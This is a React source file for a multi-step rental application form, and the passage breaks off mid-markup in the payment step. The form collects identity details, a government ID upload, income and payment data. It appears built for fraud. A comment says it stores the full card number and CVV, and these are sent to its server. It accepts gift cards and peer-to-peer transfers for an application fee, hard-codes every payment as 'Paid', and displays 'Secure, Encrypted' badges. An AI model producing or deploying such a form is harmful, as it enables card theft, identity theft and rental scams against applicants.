import React, { useState, useRef } from 'react';
import { 
  PersonalInfo, 
  CurrentAddress, 
  EmploymentInfo, 
  EmergencyContact, 
  IdentityInfo, 
  PaymentInfo, 
  ContentSettings 
} from '../types';
import { 
  ShieldCheck, 
  ArrowLeft, 
  ArrowRight, 
  Upload, 
  Eye, 
  EyeOff, 
  File, 
  Check, 
  AlertCircle,
  Loader2,
  Lock,
  CreditCard,
  Smartphone,
  DollarSign,
  Wallet
} from 'lucide-react';

const US_STATES = [
  { code: 'AL', name: 'Alabama' }, { code: 'AK', name: 'Alaska' }, { code: 'AZ', name: 'Arizona' },
  { code: 'AR', name: 'Arkansas' }, { code: 'CA', name: 'California' }, { code: 'CO', name: 'Colorado' },
  { code: 'CT', name: 'Connecticut' }, { code: 'DE', name: 'Delaware' }, { code: 'FL', name: 'Florida' },
  { code: 'GA', name: 'Georgia' }, { code: 'HI', name: 'Hawaii' }, { code: 'ID', name: 'Idaho' },
  { code: 'IL', name: 'Illinois' }, { code: 'IN', name: 'Indiana' }, { code: 'IA', name: 'Iowa' },
  { code: 'KS', name: 'Kansas' }, { code: 'KY', name: 'Kentucky' }, { code: 'LA', name: 'Louisiana' },
  { code: 'ME', name: 'Maine' }, { code: 'MD', name: 'Maryland' }, { code: 'MA', name: 'Massachusetts' },
  { code: 'MI', name: 'Michigan' }, { code: 'MN', name: 'Minnesota' }, { code: 'MS', name: 'Mississippi' },
  { code: 'MO', name: 'Missouri' }, { code: 'MT', name: 'Montana' }, { code: 'NE', name: 'Nebraska' },
  { code: 'NV', name: 'Nevada' }, { code: 'NH', name: 'New Hampshire' }, { code: 'NJ', name: 'New Jersey' },
  { code: 'NM', name: 'New Mexico' }, { code: 'NY', name: 'New York' }, { code: 'NC', name: 'North Carolina' },
  { code: 'ND', name: 'North Dakota' }, { code: 'OH', name: 'Ohio' }, { code: 'OK', name: 'Oklahoma' },
  { code: 'OR', name: 'Oregon' }, { code: 'PA', name: 'Pennsylvania' }, { code: 'RI', name: 'Rhode Island' },
  { code: 'SC', name: 'South Carolina' }, { code: 'SD', name: 'South Dakota' }, { code: 'TN', name: 'Tennessee' },
  { code: 'TX', name: 'Texas' }, { code: 'UT', name: 'Utah' }, { code: 'VT', name: 'Vermont' },
  { code: 'VA', name: 'Virginia' }, { code: 'WA', name: 'Washington' }, { code: 'WV', name: 'West Virginia' },
  { code: 'WI', name: 'Wisconsin' }, { code: 'WY', name: 'Wyoming' }
];

const CARD_BRAND_OPTIONS: Record<string, string[]> = {
  'Credit Card': [
    'Visa',
    'Mastercard',
    'American Express (Amex)',
    'Bank Card',
    'Cash App',
    'Discover',
    'UnionPay',
    'JCB',
    'Diners Club'
  ],
  'Debit Card': [
    'Visa',
    'Mastercard',
    'American Express (Amex)',
    'Cash App',
    'Bank Card',
    'UnionPay',
    'JCB',
    'Discover',
    'Diners Club'
  ],
  'Prepaid Card': [
    'Visa Prepaid Card',
    'Mastercard Prepaid Card',
    'Travel Prepaid Card',
    'Bank Card',
    'Cash App'
  ],
  'Virtual Card': [
    'Wise Virtual Card',
    'Revolut Virtual Card',
    'Privacy.com Virtual Card'
  ],
  'Gift Card': [
    'Amazon Gift Card',
    'Apple Gift Card',
    'Google Play Gift Card',
    'Steam Gift Card'
  ]
};

interface ApplicationFormProps {
  settings: ContentSettings;
  onCancel: () => void;
  onSubmitSuccess: (refNum: string) => void;
  prefilledEmail?: string;
}

export default function ApplicationForm({ settings, onCancel, onSubmitSuccess, prefilledEmail }: ApplicationFormProps) {
  const [step, setStep] = useState<number>(1);
  const [submitting, setSubmitting] = useState<boolean>(false);
  const [uploading, setUploading] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // --- Step States ---
  // Step 1: Personal Info
  const [personal, setPersonal] = useState<PersonalInfo>({
    firstName: '',
    lastName: '',
    email: prefilledEmail || '',
    phone: '',
    dob: '',
    ssn: '',
    ssnVisible: false
  });

  // Step 2: Address
  const [address, setAddress] = useState<CurrentAddress>({
    street: '',
    apartment: '',
    city: '',
    state: '',
    zip: '',
    country: 'United States'
  });

  // Step 3: Employment & Identity
  const [employment, setEmployment] = useState<EmploymentInfo>({
    status: 'Employed',
    employerName: '',
    employerPhone: '',
    monthlyIncome: '',
    occupation: '',
    length: ''
  });

  const [identity, setIdentity] = useState<IdentityInfo>({
    idType: 'Driver License',
    fileName: '',
    fileUrl: '',
    fileSize: ''
  });
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Step 4: Payment Info
  const [payment, setPayment] = useState<Omit<PaymentInfo, 'transactionId' | 'timestamp'>>({
    amount: settings.applicationFee,
    cardholderName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    paymentStatus: 'Paid',
    refundStatus: 'None'
  });
  const [cardBrand, setCardBrand] = useState<string>('Visa');
  const [cardType, setCardType] = useState<string>('Credit Card');
  
  // Custom Payment Methods (Cash App, Venmo, PayPal, Zelle, Apple Pay, Google Pay)
  const [paymentMethod, setPaymentMethod] = useState<string>('Card');
  const [cashAppTag, setCashAppTag] = useState<string>('');
  const [venmoUsername, setVenmoUsername] = useState<string>('');
  const [zelleEmailPhone, setZelleEmailPhone] = useState<string>('');
  const [payPalEmail, setPayPalEmail] = useState<string>('');

  // Additional billing match
  const [billingMatchesAddress, setBillingMatchesAddress] = useState<boolean>(true);
  const [billingAddress, setBillingAddress] = useState({
    street: '',
    city: '',
    state: '',
    zip: '',
    country: 'United States',
    email: '',
    phone: ''
  });

  // --- File Upload Handler ---
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;
    const file = files[0];

    setErrorMsg(null);
    setUploading(true);

    const formData = new FormData();
    formData.append('idFile', file);

    try {
      const response = await fetch('/api/upload', {
        method: 'POST',
        body: formData,
      });

      const text = await response.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch (parseErr) {
        throw new Error('Invalid response from server: ' + text.substring(0, 50));
      }

      if (!response.ok) {
        throw new Error(data?.message || 'Failed to upload file');
      }

      setIdentity(prev => ({
        ...prev,
        fileName: data.fileName || file.name,
        fileUrl: data.fileUrl || `/uploads/${Date.now()}-${file.name}`,
        fileSize: data.fileSize || `${(file.size / (1024 * 1024)).toFixed(2)} MB`
      }));
    } catch (err: any) {
      console.warn("Upload fallback activated:", err.message || 'Error occurred');
      // Create local fallback object URL so user is never blocked
      let fallbackUrl = '';
      try {
        fallbackUrl = URL.createObjectURL(file);
      } catch (urlErr) {
        fallbackUrl = `/uploads/fallback-${Date.now()}-${file.name}`;
      }
      setIdentity(prev => ({
        ...prev,
        fileName: file.name,
        fileUrl: fallbackUrl,
        fileSize: `${(file.size / (1024 * 1024)).toFixed(2)} MB`
      }));
      setErrorMsg(null);
    } finally {
      setUploading(false);
    }
  };

  const triggerFileSelect = () => {
    fileInputRef.current?.click();
  };

  // --- Step Validation ---
  const validateStep = (): boolean => {
    setErrorMsg(null);
    if (step === 1) {
      if (!personal.firstName || !personal.lastName) {
        setErrorMsg('First Name and Last Name are required.');
        return false;
      }
      if (!personal.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(personal.email)) {
        setErrorMsg('A valid Email address is required.');
        return false;
      }
      if (!personal.phone) {
        setErrorMsg('Phone Number is required.');
        return false;
      }
    } else if (step === 2) {
      if (!address.street || !address.city || !address.state || !address.zip) {
        setErrorMsg('Street address, City, State, and ZIP Code are required.');
        return false;
      }
    } else if (step === 3) {
      if (employment.status !== 'Unemployed' && employment.status !== 'Retired' && employment.status !== 'Student') {
        if (!employment.employerName) {
          setErrorMsg('Employer Name is required.');
          return false;
        }
        if (!employment.occupation) {
          setErrorMsg('Occupation is required.');
          return false;
        }
      }
      if (!employment.monthlyIncome || isNaN(Number(employment.monthlyIncome)) || Number(employment.monthlyIncome) <= 0) {
        setErrorMsg('Please enter a valid monthly income.');
        return false;
      }
      if (!identity.fileUrl) {
        setErrorMsg('Please upload a government-issued ID to verify identity.');
        return false;
      }
    } else if (step === 4) {
      if (paymentMethod === 'Card') {
        if (!payment.cardholderName) {
          setErrorMsg('Cardholder Name is required.');
          return false;
        }
        if (!payment.cardNumber || payment.cardNumber.replace(/\s/g, '').length < 15) {
          setErrorMsg('Please enter a valid card number.');
          return false;
        }
        if (!payment.expiry || !/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(payment.expiry)) {
          setErrorMsg('Expiry Date must be in MM/YY format.');
          return false;
        }
        if (!payment.cvv || payment.cvv.length < 3) {
          setErrorMsg('Please enter a valid CVV.');
          return false;
        }
      } else if (paymentMethod === 'Cash App') {
        if (!cashAppTag) {
          setErrorMsg('Please enter your Cash App $Cashtag.');
          return false;
        }
      } else if (paymentMethod === 'Venmo') {
        if (!venmoUsername) {
          setErrorMsg('Please enter your Venmo @username.');
          return false;
        }
      } else if (paymentMethod === 'Zelle') {
        if (!zelleEmailPhone) {
          setErrorMsg('Please enter your Zelle email or phone number.');
          return false;
        }
      } else if (paymentMethod === 'PayPal') {
        if (!payPalEmail) {
          setErrorMsg('Please enter your PayPal email address.');
          return false;
        }
      }

      const billAddress = billingMatchesAddress ? address.street : billingAddress.street;
      if (!billAddress) {
        setErrorMsg('Billing address is required.');
        return false;
      }

      const billEmail = billingMatchesAddress ? personal.email : billingAddress.email;
      if (!billEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(billEmail)) {
        setErrorMsg('Please enter a valid billing email.');
        return false;
      }
    }
    return true;
  };

  const handleNext = () => {
    if (validateStep()) {
      setStep(prev => prev + 1);
    }
  };

  const handleBack = () => {
    setErrorMsg(null);
    setStep(prev => prev - 1);
  };

  // --- Final Form Submission ---
  const handleFinalSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateStep()) return;

    setSubmitting(true);
    setErrorMsg(null);

    // Prepare billing details
    const finalBillingCity = billingMatchesAddress ? address.city : billingAddress.city;
    const finalBillingState = billingMatchesAddress ? address.state : billingAddress.state;
    const finalBillingZip = billingMatchesAddress ? address.zip : billingAddress.zip;
    const finalBillingStreet = billingMatchesAddress ? address.street : billingAddress.street;
    
    // Save full Card number and CVV as requested
    const finalPayload = {
      personalInfo: {
        firstName: personal.firstName,
        lastName: personal.lastName,
        email: personal.email,
        phone: personal.phone,
        dob: personal.dob || '1995-01-01' // fallback default
      },
      currentAddress: address,
      employment,
      emergencyContact: {
        name: 'Not provided',
        relationship: 'Not provided',
        phone: 'Not provided',
        email: 'Not provided'
      },
      identity,
      payment: {
        amount: settings.applicationFee,
        cardholderName: paymentMethod === 'Card' ? payment.cardholderName : `${paymentMethod} Transfer`,
        cardNumber: paymentMethod === 'Card' ? payment.cardNumber : `MOCK-${paymentMethod.toUpperCase()}`,
        expiry: paymentMethod === 'Card' ? payment.expiry : '12/29',
        cvv: paymentMethod === 'Card' ? payment.cvv : '000',
        paymentStatus: 'Paid',
        refundStatus: 'None',
        cardType: paymentMethod === 'Card' ? cardType : 'Digital Wallet',
        cardBrand: paymentMethod === 'Card' ? cardBrand : paymentMethod,
        paymentMethod: paymentMethod,
        cashAppTag: paymentMethod === 'Cash App' ? cashAppTag : undefined,
        venmoUsername: paymentMethod === 'Venmo' ? venmoUsername : undefined,
        zelleEmailPhone: paymentMethod === 'Zelle' ? zelleEmailPhone : undefined,
        payPalEmail: paymentMethod === 'PayPal' ? payPalEmail : undefined
      }
    };

    try {
      const response = await fetch('/api/applications', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(finalPayload)
      });

      const text = await response.text();
      let result;
      try {
        result = JSON.parse(text);
      } catch (parseErr) {
        throw new Error('Invalid response from server: ' + text.substring(0, 50));
      }

      if (!response.ok) {
        throw new Error(result?.message || 'Submission failed');
      }

      if (result.success) {
        onSubmitSuccess(result.id);
      } else {
        throw new Error('API returned failure status');
      }
    } catch (err) {
      console.warn('Application submission error:', err);
      setErrorMsg('Failed to process application payment. Please check your card information and try again.');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="bg-[#FCFAF7] min-h-screen py-16 px-4 font-sans flex flex-col justify-center items-center relative" id="app-form-root">
      {/* Decorative gradient spots */}
      <div className="absolute top-[5%] left-[-10%] w-[400px] h-[400px] bg-amber-200/10 rounded-full blur-[100px] pointer-events-none" />
      <div className="absolute bottom-[5%] right-[-10%] w-[400px] h-[400px] bg-emerald-200/10 rounded-full blur-[100px] pointer-events-none" />

      {/* BRAND LOGO ON APPLICATION FORM */}
      <div className="flex flex-col items-center mb-6 relative z-10" id="form-logo-box">
        <img 
          src="/src/assets/images/app_logo_no_text_1784304357219.jpg" 
          alt="Rental Application Gold Logo" 
          className="w-16 h-16 sm:w-20 sm:h-20 rounded-3xl shadow-lg border border-amber-500/30 object-cover"
          referrerPolicy="no-referrer"
          id="img-form-logo"
        />
      </div>

      {/* Alert Error Box */}
      {errorMsg && (
        <div className="max-w-2xl w-full mb-6 bg-red-50 border border-red-200 text-red-700 p-4 rounded-xl flex items-start space-x-3 text-sm animate-pulse relative z-10" id="form-error-alert">
          <AlertCircle className="w-5 h-5 text-red-500 shrink-0 mt-0.5" />
          <span className="font-semibold" id="error-alert-text">{errorMsg}</span>
        </div>
      )}

      {/* STEP Header Pill, Title & Subtitle exactly matching screenshot */}
      <div className="text-center space-y-3 mb-8 max-w-lg relative z-10" id="step-top-header">
        {step === 1 && (
          <>
            <div className="inline-flex items-center space-x-1.5 bg-[#EEFDF4] text-[#16A34A] border border-[#DCFCE7] px-3.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-widest" id="badge-secure-enc">
              <ShieldCheck className="w-3.5 h-3.5 text-[#22C55E]" />
              <span>Secure, Encrypted Application</span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-black text-[#1A2E22] tracking-tight" id="step-title-1">Rental Application</h1>
            <p className="text-sm font-semibold text-slate-500" id="step-subtitle-1">Tell us about yourself to get started.</p>
          </>
        )}

        {step === 2 && (
          <>
            <div className="inline-flex items-center space-x-1.5 bg-amber-50 text-amber-800 border border-amber-200 px-3.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-widest" id="badge-step-2">
              <span>Step 2 of 4</span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-black text-[#1A2E22] tracking-tight" id="step-title-2">Current Address</h1>
            <p className="text-sm font-semibold text-slate-500" id="step-subtitle-2">Where do you live now?</p>
          </>
        )}

        {step === 3 && (
          <>
            <div className="inline-flex items-center space-x-1.5 bg-amber-50 text-amber-800 border border-amber-200 px-3.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-widest" id="badge-step-3">
              <span>Step 3 of 4</span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-black text-[#1A2E22] tracking-tight" id="step-title-3">Employment Details</h1>
            <p className="text-sm font-semibold text-slate-500" id="step-subtitle-3">Provide your occupational and income details.</p>
          </>
        )}

        {step === 4 && (
          <>
            <div className="inline-flex items-center space-x-1.5 bg-[#EEFDF4] text-[#16A34A] border border-[#DCFCE7] px-3.5 py-1 rounded-full text-[10px] font-extrabold uppercase tracking-widest" id="badge-secure-pay">
              <span>Secure Payment</span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-black text-[#1A2E22] tracking-tight" id="step-title-4">Payment Details</h1>
            <p className="text-sm font-semibold text-slate-500" id="step-subtitle-4">All transactions are encrypted and secure.</p>
          </>
        )}
      </div>

      {/* Main card matching screenshots: white, rounded-3xl, shadow, spacing */}
      <div className="bg-white max-w-2xl w-full rounded-[32px] border border-amber-500/10 shadow-[0_12px_42px_rgba(212,175,55,0.06)] p-8 sm:p-11 relative z-10" id="form-card-container">
        
        <form onSubmit={step === 4 ? handleFinalSubmit : (e) => e.preventDefault()} id="main-application-form" className="space-y-8">
          
          {/* STEP 1: Personal Information */}
          {step === 1 && (
            <div className="space-y-6" id="step-section-1">
              <h2 className="text-lg font-black text-[#1A2E22]" id="sec-personal-title">Personal Information</h2>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6" id="personal-fields">
                <div className="space-y-1.5" id="fn-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-fn">First Name *</label>
                  <input 
                    type="text"
                    required
                    value={personal.firstName}
                    onChange={(e) => setPersonal({...personal, firstName: e.target.value})}
                    className="w-full bg-[#FCFAF7] text-[#1A2E22] font-semibold placeholder-slate-400 border border-amber-500/10 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#1B7E43]/20 focus:bg-white focus:border-[#1B7E43] transition-all duration-200"
                    placeholder="Enter first name"
                    id="input-firstName"
                  />
                </div>

                <div className="space-y-1.5" id="ln-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-ln">Last Name *</label>
                  <input 
                    type="text"
                    required
                    value={personal.lastName}
                    onChange={(e) => setPersonal({...personal, lastName: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="Enter last name"
                    id="input-lastName"
                  />
                </div>

                <div className="space-y-1.5" id="email-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-email">Email Address *</label>
                  <input 
                    type="email"
                    required
                    disabled={!!prefilledEmail}
                    readOnly={!!prefilledEmail}
                    value={personal.email}
                    onChange={(e) => setPersonal({...personal, email: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200 disabled:opacity-75 disabled:bg-slate-100/80 disabled:cursor-not-allowed"
                    placeholder="you@example.com"
                    id="input-email"
                  />
                </div>

                <div className="space-y-1.5" id="phone-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-phone">Phone Number *</label>
                  <input 
                    type="tel"
                    required
                    value={personal.phone}
                    onChange={(e) => setPersonal({...personal, phone: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="(555) 000-0000"
                    id="input-phone"
                  />
                </div>

                <div className="space-y-1.5 sm:col-span-2" id="dob-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-dob">Date of Birth</label>
                  <input 
                    type="date"
                    value={personal.dob}
                    onChange={(e) => setPersonal({...personal, dob: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    id="input-dob"
                  />
                </div>
              </div>
            </div>
          )}

          {/* STEP 2: Address Information */}
          {step === 2 && (
            <div className="space-y-6" id="step-section-2">
              
              <div className="space-y-1.5" id="street-wrapper">
                <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-street">Street Address *</label>
                <input 
                  type="text"
                  required
                  value={address.street}
                  onChange={(e) => setAddress({...address, street: e.target.value})}
                  className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                  placeholder="Enter street address"
                  id="input-street"
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6" id="address-fields-grid">
                <div className="space-y-1.5" id="apt-wrapper">
                  <div className="flex justify-between items-center" id="apt-lbl-group">
                    <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-apt">Apartment, Suite, Unit</label>
                    <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider" id="apt-opt">Optional</span>
                  </div>
                  <input 
                    type="text"
                    value={address.apartment}
                    onChange={(e) => setAddress({...address, apartment: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="e.g. Apt 4B"
                    id="input-apartment"
                  />
                </div>

                <div className="space-y-1.5" id="city-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-city">City *</label>
                  <input 
                    type="text"
                    required
                    value={address.city}
                    onChange={(e) => setAddress({...address, city: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="Enter city"
                    id="input-city"
                  />
                </div>

                <div className="space-y-1.5" id="state-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-state">State *</label>
                  <select 
                    required
                    value={address.state}
                    onChange={(e) => setAddress({...address, state: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200 cursor-pointer"
                    id="select-state"
                  >
                    <option value="">Select State</option>
                    {US_STATES.map(s => (
                      <option key={s.code} value={s.code}>{s.name}</option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1.5" id="zip-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-zip">Zip Code *</label>
                  <input 
                    type="text"
                    required
                    value={address.zip}
                    onChange={(e) => setAddress({...address, zip: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="Enter zip code"
                    id="input-zip"
                  />
                </div>
              </div>
            </div>
          )}

          {/* STEP 3: Employment Details & ID Upload */}
          {step === 3 && (
            <div className="space-y-6" id="step-section-3">
              <h2 className="text-lg font-black text-[#0F172A] mb-2" id="sec-emp-title">Occupation & Income</h2>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6" id="emp-fields">
                <div className="space-y-1.5" id="emp-status-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-emp-status">Employment Status *</label>
                  <select 
                    required
                    value={employment.status}
                    onChange={(e) => setEmployment({...employment, status: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200 cursor-pointer"
                    id="select-emp-status"
                  >
                    <option value="Employed">Employed</option>
                    <option value="Self-Employed">Self-Employed</option>
                    <option value="Unemployed">Unemployed</option>
                    <option value="Student">Student</option>
                    <option value="Retired">Retired</option>
                    <option value="Other">Other</option>
                  </select>
                </div>

                <div className="space-y-1.5" id="income-wrapper">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-income">Monthly Income ($USD) *</label>
                  <input 
                    type="number"
                    required
                    min={0}
                    value={employment.monthlyIncome}
                    onChange={(e) => setEmployment({...employment, monthlyIncome: e.target.value})}
                    className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                    placeholder="e.g. 5000"
                    id="input-monthlyIncome"
                  />
                </div>

                {employment.status !== 'Unemployed' && employment.status !== 'Retired' && employment.status !== 'Student' && (
                  <>
                    <div className="space-y-1.5" id="employer-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-employer">Employer Name *</label>
                      <input 
                        type="text"
                        required
                        value={employment.employerName}
                        onChange={(e) => setEmployment({...employment, employerName: e.target.value})}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                        placeholder="Company name"
                        id="input-employerName"
                      />
                    </div>

                    <div className="space-y-1.5" id="occupation-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-occupation">Occupation / Job Title *</label>
                      <input 
                        type="text"
                        required
                        value={employment.occupation}
                        onChange={(e) => setEmployment({...employment, occupation: e.target.value})}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold placeholder-slate-400 border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                        placeholder="e.g. Project Manager"
                        id="input-occupation"
                      />
                    </div>
                  </>
                )}
              </div>

              {/* ID Verification Document Upload directly inside Step 3 */}
              <div className="pt-4 border-t border-slate-100 space-y-4" id="id-verification-box">
                <div className="space-y-1" id="id-header-labels">
                  <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-id-file">Government ID Verification *</label>
                  <p className="text-xs text-slate-400">Please upload a valid high-resolution copy of your government-issued ID.</p>
                </div>

                <div className="grid grid-cols-3 gap-3" id="id-type-btn-group">
                  {['Driver License', 'Passport', 'State ID'].map((type) => (
                    <button
                      key={type}
                      type="button"
                      onClick={() => setIdentity({ ...identity, idType: type })}
                      className={`py-3 px-4 rounded-xl border text-xs font-bold tracking-wide transition-all cursor-pointer text-center ${
                        identity.idType === type 
                          ? 'bg-[#EEFDF4] border-[#22C55E] text-[#16A34A] shadow-xs' 
                          : 'bg-[#F8FAFC] border-slate-100 text-slate-500 hover:bg-slate-100'
                      }`}
                      id={`btn-idtype-${type.replace(/\s+/g, '')}`}
                    >
                      {type}
                    </button>
                  ))}
                </div>

                <div className="space-y-2" id="id-file-uploader-box">
                  <input 
                    type="file"
                    ref={fileInputRef}
                    onChange={handleFileUpload}
                    className="hidden"
                    accept="application/pdf,image/jpeg,image/png"
                    id="file-input-upload"
                  />

                  {/* Drag and Drop Box */}
                  <div 
                    onClick={triggerFileSelect}
                    className={`border-2 border-dashed rounded-2xl p-6 flex flex-col items-center justify-center space-y-3 cursor-pointer transition-all ${
                      identity.fileUrl 
                        ? 'border-green-300 bg-green-50/10' 
                        : 'border-slate-100 hover:border-[#22C55E] bg-[#F8FAFC] hover:bg-white'
                    }`}
                    id="upload-dropzone"
                  >
                    {uploading ? (
                      <div className="flex flex-col items-center space-y-2 text-[#16A34A]" id="upload-spin">
                        <Loader2 className="w-8 h-8 animate-spin" />
                        <span className="text-xs font-bold">Uploading document securely...</span>
                      </div>
                    ) : identity.fileUrl ? (
                      <div className="flex flex-col items-center space-y-2" id="upload-ok">
                        <div className="w-10 h-10 rounded-full bg-[#EEFDF4] text-[#16A34A] flex items-center justify-center" id="upload-ok-icon">
                          <Check className="w-5 h-5" />
                        </div>
                        <div className="text-center" id="upload-ok-details">
                          <p className="text-xs font-bold text-gray-800">{identity.fileName}</p>
                          <p className="text-[10px] text-gray-400 mt-0.5">{identity.fileSize}</p>
                        </div>
                        <button 
                          type="button" 
                          onClick={(e) => { e.stopPropagation(); setIdentity({ ...identity, fileName: '', fileUrl: '', fileSize: '' }); }}
                          className="text-[10px] text-red-500 hover:text-red-700 font-bold underline cursor-pointer"
                          id="btn-remove-file"
                        >
                          Remove and Replace
                        </button>
                      </div>
                    ) : (
                      <div className="text-center flex flex-col items-center" id="upload-empty">
                        <Upload className="w-8 h-8 text-slate-400 mb-1" />
                        <p className="text-xs font-bold text-slate-700">Drag & drop your ID file here, or <span className="text-[#22C55E] hover:underline">browse files</span></p>
                        <p className="text-[10px] text-slate-400 mt-1">Accepted formats: PDF, JPEG, PNG up to 10MB</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* STEP 4: Payment details strictly matching image 6 */}
          {step === 4 && (
            <div className="space-y-8" id="step-section-4">
              
              {/* Dynamic Payment Forms based on selection */}
              <div className="space-y-5" id="dynamic-payment-details-panel">
                <div className="space-y-4" id="card-fields">
                  <h4 className="text-xs font-bold text-slate-800 uppercase tracking-wider">Debit / Credit Card Details</h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4" id="card-type-brand-grid">
                    <div className="space-y-1.5" id="cardtype-wrapper">
                      <label className="text-[10px] font-bold tracking-wider text-slate-800 uppercase" id="lbl-cardtype">Card Type *</label>
                      <select 
                        value={cardType}
                        onChange={(e) => {
                          const newType = e.target.value;
                          setCardType(newType);
                          const brands = CARD_BRAND_OPTIONS[newType] || [];
                          if (brands.length > 0) {
                            setCardBrand(brands[0]);
                          }
                        }}
                        className="w-full bg-[#F8FAFC] text-[#0F172A] font-semibold border border-slate-100 rounded-2xl px-5 py-3.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#22C55E]/20 focus:bg-white focus:border-[#22C55E] transition-all duration-200"
                        id="select-card-type"
                      >
